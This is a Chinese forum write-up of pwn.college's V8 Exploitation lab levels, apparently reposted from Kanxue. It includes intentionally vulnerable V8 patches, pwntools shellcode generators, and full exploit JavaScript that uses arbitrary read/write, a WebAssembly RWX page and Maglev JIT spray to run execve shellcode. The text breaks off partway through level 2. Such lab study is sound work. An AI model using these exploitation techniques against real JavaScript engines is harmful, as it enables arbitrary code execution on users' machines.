> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.kanxue.com](https://bbs.kanxue.com/thread-287117.htm)

> [原创] Pwncollege V8 Exploitation 完结

[原创] Pwncollege V8 Exploitation 完结

发表于: 4 小时前 26

[举报](javascript:void(0);)

### [原创] Pwncollege V8 Exploitation 完结

 [![](http://passport.kanxue.com/upload/avatar/428/971428.png?1741530675)](user-home-971428.htm) [flyyyy](user-home-971428.htm) ![](https://bbs.kanxue.com/view/img/rank/5.png)  ![](http://passport.kanxue.com/pc/view/img/moon.gif)![](http://passport.kanxue.com/pc/view/img/star.gif) [ 举报](javascript:void(0);) 4 小时前  26

目录
==

目录

*   [目录](#目录)
*   [前言](#前言)
*   [level-1](#level-1)
*            [环境搭建](#环境搭建)
*            [漏洞分析](#漏洞分析)
*            [漏洞利用](#漏洞利用)
*            [exp](#exp)
*   [level-2](#level-2)
*            [环境搭建](#环境搭建-1)
*            [漏洞分析](#漏洞分析-1)
*            [漏洞利用](#漏洞利用-1)
*                    [劫持 jump table 失败（后续查看下原因](#劫持jump-table-失败（后续查看下原因)
*                    [JIT Spray](#jit-spray)
*                            [方法的利用步骤](#方法的利用步骤)
*                            [shellcode 生成](#shellcode生成)
*                            [遇到的一些问题](#遇到的一些问题)
*                    [exp](#exp-1)
*   [level-3](#level-3)
*            [环境搭建](#环境搭建-2)
*            [漏洞分析](#漏洞分析-2)
*            [漏洞利用](#漏洞利用-2)
*            [exp](#exp-2)
*   [level-4](#level-4)
*            [环境搭建](#环境搭建-3)
*            [漏洞分析](#漏洞分析-3)
*            [漏洞利用](#漏洞利用-3)
*            [exp](#exp-3)
*   [level-5](#level-5)
*            [环境搭建](#环境搭建-4)
*            [漏洞分析](#漏洞分析-4)
*            [漏洞利用](#漏洞利用-4)
*            [exp](#exp-4)
*   [level-6](#level-6)
*            [环境搭建](#环境搭建-5)
*            [漏洞分析](#漏洞分析-5)
*            [漏洞利用](#漏洞利用-5)
*            [exp](#exp-5)
*   [level-7](#level-7)
*            [环境搭建](#环境搭建-6)
*            [漏洞分析](#漏洞分析-6)
*            [漏洞利用](#漏洞利用-6)
*            [exp](#exp-6)
*   [level-8](#level-8)
*            [环境搭建](#环境搭建-7)
*            [漏洞分析](#漏洞分析-7)
*            [漏洞利用](#漏洞利用-7)
*            [exp](#exp-7)
*   [level-9](#level-9)
*            [环境搭建](#环境搭建-8)
*            [漏洞分析](#漏洞分析-8)
*            [漏洞利用](#漏洞利用-8)
*            [exp](#exp-8)

前言
==

笔者以巩固基础为目的，完成了 pwncollege 的 [V8 Exploitation](elink@b19K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3N6$3&6Q4x3X3g2U0L8$3I4D9k6h3N6W2i4K6u0r3M7i4g2S2M7Y4c8W2M7X3I4&6i4K6u0V1M7i4g2A6P5W2)9J5c8Y4j5^5i4K6u0V1k6i4S2H3L8r3!0A6N6r3q4@1K9h3!0F1) 课程。整体而言，题目质量不错，但偏向于入门，因此特地整理了一篇通关笔记。若文中有疏漏或错误之处，欢迎各位师傅批评指正！

提前开一波香槟，完结

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_KufvYZe1AK.png)

level-1
=======

环境搭建
----

> 漏洞分析里有完整的 patch 内容

```
git reset --hard 5a2307d0f2c5b650c6858e2b9b57b335a59946ff
gclient sync -D
git apply < ./patch
gn gen out/release
```

修改编译参数

```
➜  release git:(5a2307d0f2c) ✗ cat args.gn  
# Set build arguments here. See `gn help buildargs`.
is_component_build = false
is_debug = false 
target_cpu = "x64"
v8_enable_sandbox = false
v8_enable_backtrace = true
v8_enable_disassembler = true
v8_enable_object_print = true
dcheck_always_on = false
use_goma = false
v8_code_pointer_sandboxing = false
```

接着编译

```
autoninja -C out/release d8
```

漏洞分析
----

为 array 类型创建了一个 run 方法

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_gvlcvzi5_e.png)

首先，该函数会检查传入的对象是否为 JSArray，并且要求数组的元素类型必须是简单类型（即没有 holes、不是对象等）。接下来，会判断数组的 elements kind 是否为 PACKED_DOUBLE_ELEMENTS，也就是要求数组中的所有元素都是 double 类型（即 JavaScript 的 Number 类型，且不是 int32、BigInt 或对象等）。随后，函数会检查数组的长度，确保其不会超过 4096 字节（也就是最多 512 个 double 元素），以防止溢出。

通过这些检查后，函数会调用 mmap 申请一段 4096 字节、具有读写执行（RWX）权限的内存区域。实际上，在这一步就可以将 shellcode 写入到该内存区域。随后，函数会将 JSArray 中的所有 double 元素逐个拷贝到新申请的 RWX 段中。最后，函数将这段内存作为函数指针直接执行，也就是运行了你拷贝进去的 shellcode。

```
+BUILTIN(ArrayRun) {
+  HandleScope scope(isolate);
+  Factory *factory = isolate->factory();
+  Handle receiver = args.receiver();
+
+  if (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, Cast(*receiver))) {
+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+      factory->NewStringFromAsciiChecked("Nope")));
+  }
+
+  Handle array = Cast(receiver);
+  ElementsKind kind = array->GetElementsKind();
+
+  if (kind != PACKED_DOUBLE_ELEMENTS) {
+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+      factory->NewStringFromAsciiChecked("Need array of double numbers")));
+  }
+
+  uint32_t length = static_cast(Object::NumberValue(array->length()));
+  if (sizeof(double) * (uint64_t)length > 4096) {
+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+      factory->NewStringFromAsciiChecked("array too long")));
+  }
+
+  // mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+  double *mem = (double *)mmap(NULL, 4096, 7, 0x22, -1, 0);
+  if (mem == (double *)-1) {
+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+      factory->NewStringFromAsciiChecked("mmap failed")));
+  }
+
+  Handle elements(Cast(array->elements()), isolate);
+  FOR_WITH_HANDLE_SCOPE(isolate, uint32_t, i = 0, i, i < length, i++, {
+    double x = elements->get_scalar(i);
+    mem[i] = x;
+  });
+
+  ((void (*)())mem)();
+  return 0;
+} 
```

鉴定为 v8 里的 ret2shellcode????????????

完整的 patch 文件内容

```
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index ea45a7ada6b..c840e568152 100644
--- a/src/builtins/builtins-array.cc
+++ b/src/builtins/builtins-array.cc
@@ -24,6 +24,8 @@
 #include "src/objects/prototype.h"
 #include "src/objects/smi.h"
  
+extern "C" void *mmap(void *, unsigned long, int, int, int, int);
+
 namespace v8 {
 namespace internal {
  
@@ -407,6 +409,47 @@ BUILTIN(ArrayPush) {
   return *isolate->factory()->NewNumberFromUint((new_length));
 }
  
+BUILTIN(ArrayRun) {
+  HandleScope scope(isolate);
+  Factory *factory = isolate->factory();
+  Handle receiver = args.receiver();
+
+  if (!IsJSArray(*receiver) || !HasOnlySimpleReceiverElements(isolate, Cast(*receiver))) {
+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+      factory->NewStringFromAsciiChecked("Nope")));
+  }
+
+  Handle array = Cast(receiver);
+  ElementsKind kind = array->GetElementsKind();
+
+  if (kind != PACKED_DOUBLE_ELEMENTS) {
+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+      factory->NewStringFromAsciiChecked("Need array of double numbers")));
+  }
+
+  uint32_t length = static_cast(Object::NumberValue(array->length()));
+  if (sizeof(double) * (uint64_t)length > 4096) {
+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+      factory->NewStringFromAsciiChecked("array too long")));
+  }
+
+  // mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+  double *mem = (double *)mmap(NULL, 4096, 7, 0x22, -1, 0);
+  if (mem == (double *)-1) {
+    THROW_NEW_ERROR_RETURN_FAILURE(isolate, NewTypeError(MessageTemplate::kPlaceholderOnly,
+      factory->NewStringFromAsciiChecked("mmap failed")));
+  }
+
+  Handle elements(Cast(array->elements()), isolate);
+  FOR_WITH_HANDLE_SCOPE(isolate, uint32_t, i = 0, i, i < length, i++, {
+    double x = elements->get_scalar(i);
+    mem[i] = x;
+  });
+
+  ((void (*)())mem)();
+  return 0;
+}
+
 namespace {
  
 V8_WARN_UNUSED_RESULT Tagged GenericArrayPop(Isolate* isolate,
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index 78cbf8874ed..4f3d885cca7 100644
--- a/src/builtins/builtins-definitions.h
+++ b/src/builtins/builtins-definitions.h
@@ -421,6 +421,7 @@ namespace internal {
   TFJ(ArrayPrototypePop, kDontAdaptArgumentsSentinel)                          \
   /* ES6 #sec-array.prototype.push */                                          \
   CPP(ArrayPush)                                                               \
+  CPP(ArrayRun)                                                                \
   TFJ(ArrayPrototypePush, kDontAdaptArgumentsSentinel)                         \
   /* ES6 #sec-array.prototype.shift */                                         \
   CPP(ArrayShift)                                                              \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index 9a346d134b9..58fd42e59a4 100644
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1937,6 +1937,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
       return Type::Receiver();
     case Builtin::kArrayUnshift:
       return t->cache_->kPositiveSafeInteger;
+  case Builtin::kArrayRun:
+    return Type::Receiver();
  
     // ArrayBuffer functions.
     case Builtin::kArrayBufferIsView:
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index facf0d86d79..382c015bc48 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -3364,7 +3364,7 @@ Local Shell::CreateNodeTemplates(
  
 Local Shell::CreateGlobalTemplate(Isolate* isolate) {
   Local global_template = ObjectTemplate::New(isolate);
-  global_template->Set(Symbol::GetToStringTag(isolate),
+/*  global_template->Set(Symbol::GetToStringTag(isolate),
                        String::NewFromUtf8Literal(isolate, "global"));
   global_template->Set(isolate, "version",
                        FunctionTemplate::New(isolate, Version));
@@ -3385,13 +3385,13 @@ Local Shell::CreateGlobalTemplate(Isolate* isolate) {
   global_template->Set(isolate, "readline",
                        FunctionTemplate::New(isolate, ReadLine));
   global_template->Set(isolate, "load",
-                       FunctionTemplate::New(isolate, ExecuteFile));
+                       FunctionTemplate::New(isolate, ExecuteFile));*/
   global_template->Set(isolate, "setTimeout",
                        FunctionTemplate::New(isolate, SetTimeout));
   // Some Emscripten-generated code tries to call 'quit', which in turn would
   // call C's exit(). This would lead to memory leaks, because there is no way
   // we can terminate cleanly then, so we need a way to hide 'quit'.
-  if (!options.omit_quit) {
+/*  if (!options.omit_quit) {
     global_template->Set(isolate, "quit", FunctionTemplate::New(isolate, Quit));
   }
   global_template->Set(isolate, "testRunner",
@@ -3410,7 +3410,7 @@ Local Shell::CreateGlobalTemplate(Isolate* isolate) {
   if (i::v8_flags.expose_async_hooks) {
     global_template->Set(isolate, "async_hooks",
                          Shell::CreateAsyncHookTemplate(isolate));
-  }
+  }*/
  
   return global_template;
 }
diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
index 48249695b7b..40a762c24c8 100644
--- a/src/init/bootstrapper.cc
+++ b/src/init/bootstrapper.cc
@@ -2533,6 +2533,8 @@ void Genesis::InitializeGlobal(Handle global_object,
  
     SimpleInstallFunction(isolate_, proto, "at", Builtin::kArrayPrototypeAt, 1,
                           true);
+    SimpleInstallFunction(isolate_, proto, "run",
+                          Builtin::kArrayRun, 0, false);
     SimpleInstallFunction(isolate_, proto, "concat",
                           Builtin::kArrayPrototypeConcat, 1, false);
     SimpleInstallFunction(isolate_, proto, "copyWithin", 
```

漏洞利用
----

申请了一段 rwx 段，然后将用户创建的 JSArray 内容直接执行，那么提前在 JSArray 里提前布置 shellcode 就行

第一种方法，生成 shellcode 的脚本，这里是生产的是 BigInt 类型，所以还需要调用 ToDoubleArray 转化为浮点数

```
from pwn import *
 
context.arch = 'amd64'
context.os = 'linux'
 
shellcode = shellcraft.execve("/challenge/catflag", 0, 0)
output = asm(shellcode)
print(f"Shellcode 长度: {len(output)} 字节")
 
if len(output) % 8 != 0:
    padding = 8 - (len(output) % 8)
    output += b'\x00' * padding
    print(f"已填充 {padding} 字节，总长度: {len(output)} 字节")
 
bigint_array = []
for i in range(0, len(output), 8):
    chunk = output[i:i+8]
    value = int.from_bytes(chunk, 'little')
    bigint_array.append(f"{value}n")
 
js_array = "var shellcode = [\n    " + ",\n    ".join(bigint_array) + "\n];"
 
print("\nJavaScript BigInt 数组格式:")
print(js_array)
```

然后将输出的结果放到 js 脚本里，如下布置的 shellcode

```
var shellcode = [
    2608851925472796776n,
    7307011539825918209n,
    5210783956162667311n,
    7308335460934430648n,
    3589986723478130798n,
    5563462937334n
];
```

这里将类型转化，shellcode array 转化为 double array

```
function ToDoubleArray(raw) {
    let buf = new ArrayBuffer(raw.length * 8);
    let dataview = new DataView(buf);
 
    for (let i = 0; i < raw.length; ++i){
        dataview.setBigUint64(i * 8, raw[i], true);
    }
 
    const res = new Float64Array(buf);
    return Array.from(res);
}
```

第二种方法就是写浮点数的 shellcode，这里是 py 脚本

```
from pwn import *
 
context.arch = 'amd64'
context.os = 'linux'
 
shellcode = shellcraft.execve("/challenge/catflag", 0, 0)
output = asm(shellcode)
print(f"Shellcode 长度: {len(output)} 字节")
 
if len(output) % 8 != 0:
    padding = 8 - (len(output) % 8)
    output += b'\x00' * padding
    print(f"已填充 {padding} 字节，总长度: {len(output)} 字节")
 
import struct
 
double_array = []
for i in range(0, len(output), 8):
    chunk = output[i:i+8]
    value = struct.unpack('
```

输出如下，赋值到脚本里即可

```
➜  release git:(5a2307d0f2c) ✗ python3 shellcode.py 
Shellcode 长度: 46 字节
已填充 2 字节，总长度: 48 字节
 
JavaScript double 数组格式:
var shellcode = [
    2.820972645905851e-134,
    3.0758087950517603e+180,
    2.2354425876138794e+40,
    3.68572438550025e+180,
    1.054512194375715e-68,
    2.748715909248e-311
];
```

exp
---

这里直接写一个浮点数的 shellcode 就可以了

```
// function ToDoubleArray(raw) {
//     let buf = new ArrayBuffer(raw.length * 8);
//     let dataview = new DataView(buf);
 
//     for (let i = 0; i < raw.length; ++i){
//         dataview.setBigUint64(i * 8, raw[i], true);
//     }
 
//     const res = new Float64Array(buf);
//     return Array.from(res);
// }
 
// var shellcode = [
//     2608851925472796776n,
//     7307011539825918209n,
//     5210783956162667311n,
//     7308335460934430648n,
//     3589986723478130798n,
//     5563462937334n
// ];
 
// shellcode = ToDoubleArray(shellcode);
// shellcode.run();
 
 
var shellcode = [
    2.820972645905851e-134,
    3.0758087950517603e+180,
    2.2354425876138794e+40,
    3.68572438550025e+180,
    1.054512194375715e-68,
    2.748715909248e-311
];
shellcode = shellcode;
shellcode.run();
```

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_3Z_IKr7xZE.png)

level-2
=======

环境搭建
----

> 漏洞分析里有完整的 patch 内容

```
git reset --hard 5a2307d0f2c5b650c6858e2b9b57b335a59946ff
gclient sync -D
git apply < ./patch
gn gen out/release
```

修改编译参数

```
➜  release git:(5a2307d0f2c) ✗ cat args.gn                                    
# Set build arguments here. See `gn help buildargs`.
is_component_build = false
is_debug = false
target_cpu = "x64"
v8_enable_sandbox = false
v8_enable_backtrace = true
v8_enable_disassembler = true
v8_enable_object_print = true
dcheck_always_on = false
use_goma = false
v8_code_pointer_sandboxing = false
```

编译

```
autoninja -C out/release d8
```

漏洞分析
----

这里 patch 了三个函数，从名字看其实就是三个 v8 利用里常见的原语，获取对象的地址、沙箱内地址任意读写

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_SX-hqBwU7D.png)

可以看下怎么实现的，获取当前的 isolate 之后，先判断参数个数，接着判断参数的类型是不是对象（tag），然后直接获取 address

```
+void Shell::GetAddressOf(const v8::FunctionCallbackInfo& info) {
+  v8::Isolate* isolate = info.GetIsolate();
+
+  if (info.Length() == 0) {
+    isolate->ThrowError("First argument must be provided");
+    return;
+  }
+
+  internal::Handle arg = Utils::OpenHandle(*info[0]);
+  if (!IsHeapObject(*arg)) {
+    isolate->ThrowError("First argument must be a HeapObject");
+    return;
+  }
+  internal::Tagged obj = internal::Cast(*arg);
+
+  uint32_t address = static_cast(obj->address());
+  info.GetReturnValue().Set(v8::Integer::NewFromUnsigned(isolate, address));
+} 
```

获取 isolate，参数长度为 1，也就是读这个参数地址的内容，判断参数类型是否为 Number，下面获取 cage_base，其实也就是 gc 申请内存的基地址，然后类型转化一下。接着获取 full_addr（r14+addr），然后通过指针解引，返回一个 uint32_t 的结果。

> 这里之所以需要先获取 cage base 并进行地址转换，是因为 V8 启用了指针压缩（Pointer Compression）机制。该机制下，堆对象的地址并不是完整的 64 位地址，而是相对于 cage base 的 32 位偏移量。不了解的读者可以自行搜索相关资料，原理并不复杂。

```
+void Shell::ArbRead32(const v8::FunctionCallbackInfo& info) {
+  Isolate *isolate = info.GetIsolate();
+  if (info.Length() != 1) {
+    isolate->ThrowError("Need exactly one argument");
+    return;
+  }
+  internal::Handle arg = Utils::OpenHandle(*info[0]);
+  if (!IsNumber(*arg)) {
+    isolate->ThrowError("Argument should be a number");
+    return;
+  }
+  internal::PtrComprCageBase cage_base = internal::GetPtrComprCageBase();
+  internal::Address base_addr = internal::V8HeapCompressionScheme::GetPtrComprCageBaseAddress(cage_base);
+  uint32_t addr = static_cast(internal::Object::NumberValue(*arg));
+  uint64_t full_addr = base_addr + (uint64_t)addr;
+  uint32_t result = *(uint32_t *)full_addr;
+  info.GetReturnValue().Set(v8::Integer::NewFromUnsigned(isolate, result));
+} 
```

获取 isolate，限定参数长度为 2，分别获取两个参数，同时判断类型是否为 Number。下面的流程和 ArbRead32 类似，就是最后这里不是指针解引，而是`*(uint32_t *)full_addr = value;` ，这里学过 c 的都能看得懂吧

```
+void Shell::ArbWrite32(const v8::FunctionCallbackInfo& info) {
+  Isolate *isolate = info.GetIsolate();
+  if (info.Length() != 2) {
+    isolate->ThrowError("Need exactly 2 arguments");
+    return;
+  }
+  internal::Handle arg1 = Utils::OpenHandle(*info[0]);
+  internal::Handle arg2 = Utils::OpenHandle(*info[1]);
+  if (!IsNumber(*arg1) || !IsNumber(*arg2)) {
+    isolate->ThrowError("Arguments should be numbers");
+    return;
+  }
+  internal::PtrComprCageBase cage_base = internal::GetPtrComprCageBase();
+  internal::Address base_addr = internal::V8HeapCompressionScheme::GetPtrComprCageBaseAddress(cage_base);
+  uint32_t addr = static_cast(internal::Object::NumberValue(*arg1));
+  uint32_t value = static_cast(internal::Object::NumberValue(*arg2));
+  uint64_t full_addr = base_addr + (uint64_t)addr;
+  *(uint32_t *)full_addr = value;
+} 
```

完整的 patch 文件内容

```
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index facf0d86d79..6b31fe2c371 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -1283,6 +1283,64 @@ struct ModuleResolutionData {
  
 }  // namespace
  
+void Shell::GetAddressOf(const v8::FunctionCallbackInfo& info) {
+  v8::Isolate* isolate = info.GetIsolate();
+
+  if (info.Length() == 0) {
+    isolate->ThrowError("First argument must be provided");
+    return;
+  }
+
+  internal::Handle arg = Utils::OpenHandle(*info[0]);
+  if (!IsHeapObject(*arg)) {
+    isolate->ThrowError("First argument must be a HeapObject");
+    return;
+  }
+  internal::Tagged obj = internal::Cast(*arg);
+
+  uint32_t address = static_cast(obj->address());
+  info.GetReturnValue().Set(v8::Integer::NewFromUnsigned(isolate, address));
+}
+
+void Shell::ArbRead32(const v8::FunctionCallbackInfo& info) {
+  Isolate *isolate = info.GetIsolate();
+  if (info.Length() != 1) {
+    isolate->ThrowError("Need exactly one argument");
+    return;
+  }
+  internal::Handle arg = Utils::OpenHandle(*info[0]);
+  if (!IsNumber(*arg)) {
+    isolate->ThrowError("Argument should be a number");
+    return;
+  }
+  internal::PtrComprCageBase cage_base = internal::GetPtrComprCageBase();
+  internal::Address base_addr = internal::V8HeapCompressionScheme::GetPtrComprCageBaseAddress(cage_base);
+  uint32_t addr = static_cast(internal::Object::NumberValue(*arg));
+  uint64_t full_addr = base_addr + (uint64_t)addr;
+  uint32_t result = *(uint32_t *)full_addr;
+  info.GetReturnValue().Set(v8::Integer::NewFromUnsigned(isolate, result));
+}
+
+void Shell::ArbWrite32(const v8::FunctionCallbackInfo& info) {
+  Isolate *isolate = info.GetIsolate();
+  if (info.Length() != 2) {
+    isolate->ThrowError("Need exactly 2 arguments");
+    return;
+  }
+  internal::Handle arg1 = Utils::OpenHandle(*info[0]);
+  internal::Handle arg2 = Utils::OpenHandle(*info[1]);
+  if (!IsNumber(*arg1) || !IsNumber(*arg2)) {
+    isolate->ThrowError("Arguments should be numbers");
+    return;
+  }
+  internal::PtrComprCageBase cage_base = internal::GetPtrComprCageBase();
+  internal::Address base_addr = internal::V8HeapCompressionScheme::GetPtrComprCageBaseAddress(cage_base);
+  uint32_t addr = static_cast(internal::Object::NumberValue(*arg1));
+  uint32_t value = static_cast(internal::Object::NumberValue(*arg2));
+  uint64_t full_addr = base_addr + (uint64_t)addr;
+  *(uint32_t *)full_addr = value;
+}
+
 void Shell::ModuleResolutionSuccessCallback(
     const FunctionCallbackInfo& info) {
   DCHECK(i::ValidateCallbackInfo(info));
@@ -3364,7 +3422,13 @@ Local Shell::CreateNodeTemplates(
  
 Local Shell::CreateGlobalTemplate(Isolate* isolate) {
   Local global_template = ObjectTemplate::New(isolate);
-  global_template->Set(Symbol::GetToStringTag(isolate),
+  global_template->Set(isolate, "GetAddressOf",
+                       FunctionTemplate::New(isolate, GetAddressOf));
+  global_template->Set(isolate, "ArbRead32",
+                       FunctionTemplate::New(isolate, ArbRead32));
+  global_template->Set(isolate, "ArbWrite32",
+                       FunctionTemplate::New(isolate, ArbWrite32));
+/*  global_template->Set(Symbol::GetToStringTag(isolate),
                        String::NewFromUtf8Literal(isolate, "global"));
   global_template->Set(isolate, "version",
                        FunctionTemplate::New(isolate, Version));
@@ -3385,13 +3449,13 @@ Local Shell::CreateGlobalTemplate(Isolate* isolate) {
   global_template->Set(isolate, "readline",
                        FunctionTemplate::New(isolate, ReadLine));
   global_template->Set(isolate, "load",
-                       FunctionTemplate::New(isolate, ExecuteFile));
+                       FunctionTemplate::New(isolate, ExecuteFile));*/
   global_template->Set(isolate, "setTimeout",
                        FunctionTemplate::New(isolate, SetTimeout));
   // Some Emscripten-generated code tries to call 'quit', which in turn would
   // call C's exit(). This would lead to memory leaks, because there is no way
   // we can terminate cleanly then, so we need a way to hide 'quit'.
-  if (!options.omit_quit) {
+/*  if (!options.omit_quit) {
     global_template->Set(isolate, "quit", FunctionTemplate::New(isolate, Quit));
   }
   global_template->Set(isolate, "testRunner",
@@ -3410,7 +3474,7 @@ Local Shell::CreateGlobalTemplate(Isolate* isolate) {
   if (i::v8_flags.expose_async_hooks) {
     global_template->Set(isolate, "async_hooks",
                          Shell::CreateAsyncHookTemplate(isolate));
-  }
+  }*/
  
   return global_template;
 }
diff --git a/src/d8/d8.h b/src/d8/d8.h
index a19d4a0eae4..476675a7150 100644
--- a/src/d8/d8.h
+++ b/src/d8/d8.h
@@ -507,6 +507,9 @@ class Shell : public i::AllStatic {
   };
   enum class CodeType { kFileName, kString, kFunction, kInvalid, kNone };
  
+  static void GetAddressOf(const v8::FunctionCallbackInfo& args);
+  static void ArbRead32(const v8::FunctionCallbackInfo& args);
+  static void ArbWrite32(const v8::FunctionCallbackInfo& args);
   static bool ExecuteString(Isolate* isolate, Local source,
                             Local name,
                             ReportExceptions report_exceptions, 
```

漏洞利用
----

其实这里 patch 了三个可以直接利用的漏洞原语，思路就很明确了。对于 12.8 版本，这里可以采用 JIT Spray 的方法，写立即数的 shellcode，然后修改 function 的 code_addr，实现错位字节的 shellcode，也就是利用 Maglev 存在的漏洞实现控制流劫持（这里的环境不存在沙箱，所以并没有实现沙箱逃逸）如果开启了沙箱，其实这个方法还是可以实现沙箱逃逸的，但是会多一点绕过条件

### 劫持 jump table 失败（后续查看下原因

mark 一下一开始的思路，想通过覆写

d8 12.8 版本，劫持 jump table 失败

```
var buf = new ArrayBuffer(8);
var f32 = new Float32Array(buf);
var f64 = new Float64Array(buf);
var u8 = new Uint8Array(buf);
var u16 = new Uint16Array(buf);
var u32 = new Uint32Array(buf);
var u64 = new BigUint64Array(buf);
 
 
function stop(){
    %SystemBreak();
}
 
function p(arg){
    %DebugPrint(arg);
}
 
function spin(){
    while(1){};
}
 
function hex(str){
    return str.toString(16).padStart(16,0);
}
 
function logg(str,val){
    console.log("[+] "+ str + ": " + "0x" + hex(val));
}
 
function copy_shellcode_to_rwxpage(){
    let buf = new ArrayBuffer(0x20);
    let view = new DataView(buf);
    let backing_store_addr = GetAddressOf(view)-0x14;
    p(view);
    logg("backing_store_addr",backing_store_addr);
    let backing_store_lo = ArbRead32(backing_store_addr);
    let backing_store_hi = ArbRead32(backing_store_addr+0x4);
    var backing_store = BigInt(backing_store_hi) * 4294967296n + BigInt(backing_store_lo)
    logg("backing_store",backing_store);
 
    ArbWrite32(backing_store_addr,rwx_page_addr_lo);
    ArbWrite32(backing_store_addr+4,rwx_page_addr_hi);
      
    // 出现check
    for (let i = 0; i < shellcode.length; ++i){
        view.setBigUint64(i * 0x8, shellcode[i], true);
    }
}
 
var shellcode = [
    0x2fbb485299583b6an,
    0x5368732f6e69622fn,
    0x050f5e5457525f54n
];
 
for(let i = 0; i< 10000; i++) shellcode();
 
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var instance = new WebAssembly.Instance(wasmModule, {});
var pwn = instance.exports.main;
 
var instance_addr = GetAddressOf(instance);
var trusted_data = ArbRead32(instance_addr+0xc);
var rwx_page_addr_lo = ArbRead32(trusted_data+0x30-1);
var rwx_page_addr_hi = ArbRead32(trusted_data+0x30-1+4);
var rwx_page_addr = BigInt(rwx_page_addr_hi) * 4294967296n + BigInt(rwx_page_addr_lo)
console.log(typeof rwx_page_addr_lo);
p(wasmCode)
p(instance)
 
logg("instance_addr",instance_addr);
logg("trusted_data",trusted_data);
logg("rwx_page_addr_lo",rwx_page_addr_lo);
logg("rwx_page_addr_hi",rwx_page_addr_hi);
logg("rwx_page_addr",rwx_page_addr);
 
copy_shellcode_to_rwxpage();
 
spin();
```

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_LKQ3RE9IE8.png)

### JIT Spray

#### 方法的利用步骤

首先看下这一段代码的输出，这里需要关注 code 字段

```
const shellcode = () => {return [
    1.9553825422107533e-246,
    1.9560612558242147e-246,
    1.9995714719542577e-246,
    1.9533767332674093e-246,
    2.6348604765229606e-284
];}
 
for(let i = 0; i< 0x10000; i++){
    shellcode();
}
 
p(shellcode);
 
var shellcode_addr = GetAddressOf(shellcode);
```

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_kGfvIfYtbE.png)

job code，看一下输出，这个对象记录了 instruction_start 的起始地址，下面的一串 instruction 就是这一个函数经过 Maglev 优化后的代码

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_e9V9C1qIZY.png)

下面这一段其实就是我们写的 shellcode 的位置，浮点数是八字节的表示形式，去掉前面两个字节的操作，剩下的六个字节就是我们可控的内容，然后为了能写成 rop 的形式，所以 6 个字节里要已 jmp 结尾，用来跳到下一个 gadget 片段，所以我们每一个 gadget 可以写四字节的内容 + 一个 jmp

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_rYrwmpQL2O.png)

这里可以看一下写成的效果

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_5FVfuiQqmd.png)

那么接着就是可以通过修改`instruction_start` 为我们控制的 gadget 片段的起始地址，修改为起始地址 + 0x6b（这里的偏移是根据不同环境来确定的）

看一下一开始的`code: 0x1244002402a9 <Code MAGLEV>`

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_TSZX9bidKS.png)

修改之后

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_GeIIeHIBq2.png)

然后在最后的 syscall 下一个断点，gdb 里 c 过去，可以看到最后执行的效果，就是执行了`execve("catflag",0,0);` ，这样就可以拿到 flag 了

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_9tU0jvNsL9.png)

#### shellcode 生成

这里我首先使用了 py 脚本生产一段 shelcode

```
from pwn import *
context(arch='amd64')
jmp = b'\xeb\x0c'
shell_hi = 0x0067616c
shell_lo = 0x66746163
def make_double(code):
    assert len(code) <= 6
    print(hex(u64(code.ljust(6, b'\x90') + jmp))[2:])
 
make_double(asm("mov eax,%d" % (0x0067616c)))
make_double(asm("mov ebx,%d" % (0x66746163)))
make_double(asm("shl rax, 0x20"))
